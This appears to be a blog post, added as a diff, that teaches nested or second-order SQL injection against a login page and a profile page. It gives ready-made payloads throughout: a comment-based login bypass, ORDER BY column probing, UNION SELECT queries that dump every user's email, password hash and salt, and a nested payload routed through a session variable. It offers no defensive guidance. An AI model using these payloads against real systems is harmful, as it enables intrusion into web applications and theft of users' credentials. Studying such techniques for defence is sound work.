@@ -1,0 +1,109 @@
+---
+layout: post
+title: "Nested SQL Injections"
+language: "sql"
+tags:
+- sql-injection
+- ethical-hacking
+---
+I recently did something along this line, and this technique is really cool. (I prefer to call it "inception" injection). Its pretty easy once you figure it out, so here it goes.
+
+If the result of the first query is used as an input in the second query, and the first query is vulnerable, we can use the output as a "input variable" into the second query itself. This would be useful in places where the second query has a better display method than the first one (for instance length restrictions).
+
+##Query 1:
+
+{% highlight sql %}
+SELECT * FROM users WHERE email='$email' AND password = '$pass'
+{% endhighlight sql %}
+
+This query is usually accompanied with:
+
+{% highlight php %}
+<?php
+$_SESSION['email'] = $row['username'];
+{% endhighlight php %}
+
+##Query 2:
+
+Assuming something like a profile page:
+{% highlight sql %}
+SELECT * FROM user_details WHERE email='{$_SESSION['email']}'
+{% endhighlight sql %}
+#Injection
+
+Injecting the first query (basic)
+
+{% highlight sql %}
+SELECT * FROM users WHERE email='user@email.com' # AND password=''
+{% endhighlight sql %}
+
+Everything after # should be treated as a comment. Hence forward, I would not write stuff after # for brevity.
+
+Thinking backwards, we could create a custom query for user_details:
+
+{% highlight sql %}
+SELECT * FROM user_details WHERE email='' UNION SELECT * FROM user_details #
+{% endhighlight sql %}
+
+This would show the details of the first user in the profile page. Let's think a bit larger:
+
+{% highlight sql %}
+SELECT * FROM user_details WHERE email='' UNION SELECT GROUP_CONCAT(email), GROUP_CONCAT(password) FROM user_details #
+{% endhighlight sql %}
+
+Usually, this won't work (different number of columns in results). You'd have to use ORDER BY to guess the number of columns. Writing only the `UNION` part now:
+
+{% highlight sql %}
+UNION SELECT * FROM user_details ORDER BY 1 #
+UNION SELECT * FROM user_details ORDER BY 2 #
+UNION SELECT * FROM user_details ORDER BY 3 #
+UNION SELECT * FROM user_details ORDER BY 4 # -- Gives Error
+{% endhighlight sql %}
+
+So we realize that user_details has 3 columns. Coming back, we could do:
+
+{% highlight sql %}
+UNION SELECT GROUP_CONCAT(email), GROUP_CONCAT(password), 3 FROM users #
+{% endhighlight sql %}
+
+That would give us details upto 1000 characters (GROUP_CONCAT limits). To mitigate those limits:
+
+{% highlight sql %}
+UNION SELECT GROUP_CONCAT(email),GROUP_CONCAT(password),GROUP_CONCAT(salt) FROM (SELECT email,password,salt FROM users LIMIT 50 OFFSET 0)
+{% endhighlight sql %}	
+
+Change the OFFSET and you're ready to roll.
+
+##Inception Injection
+
+This was all a theoritical attack on the second query. Granted you could do lots of stuff from here on the first query, but it is far less responsive (Doesn't give much output). The only thing you can modify is the email, which offers you a single field. 
+
+However, the only attack vector (`$_SESSION`) for the second query is not directly controlled, but comes instead from the result of the first query. So to perform this attack on the second query, we take the second injection, and use it inside the first one.
+
+{% highlight sql %}
+SELECT * FROM users WHERE email='' UNION SELECT * FROM users # -- will give us first user
+SELECT * FROM users WHERE email='' UNION SELECT * FROM users  ORDER BY 1 # -- keep increasing to get number of columns
+SELECT * FROM users WHERE email='' UNION SELECT 1,2,3 FROM users # -- This would let us know which column corresponds to the email id
+SELECT * FROM users WHERE email='' UNION SELECT "<inject second query here>",2,3 FROM users # -- This would let us know which column corresponds to the email id
+{% endhighlight sql %}	
+
+Although we have been writing injection code starting with UNION, it actually would start with ' UNION... Using our last injection code for the second query here, it becomes:
+
+{% highlight sql %}
+SELECT * FROM users WHERE email='' UNION SELECT "' UNION SELECT GROUP_CONCAT(email),GROUP_CONCAT(password),GROUP_CONCAT(salt) FROM (SELECT email,password,salt FROM users LIMIT 50 OFFSET 0) #",2,3 FROM users #
+{% endhighlight sql %}	
+
+What happens on the server side:
+
+{% highlight php %}
+<?php
+	$_SERVER['email'] = "' UNION SELECT GROUP_CONCAT(email),GROUP_CONCAT(password),GROUP_CONCAT(salt) FROM (SELECT email,password,salt FROM users LIMIT 50 OFFSET 0) #"
+{% endhighlight php %}	
+
+and the second query becomes:
+
+{% highlight sql %}
+SELECT * FROM user_details WHERE email='' UNION SELECT GROUP_CONCAT(email),GROUP_CONCAT(password),GROUP_CONCAT(salt) FROM (SELECT email,password,salt FROM users LIMIT 50 OFFSET 0) #
+{% endhighlight sql %}	
+
+Note that we still have to keep a # at the end of the inner query. There are portions after # which we still need to discard. Feel free to contact me if you have any further doubts. I am sure this is a well-known and used by people already, but this was something new to me.
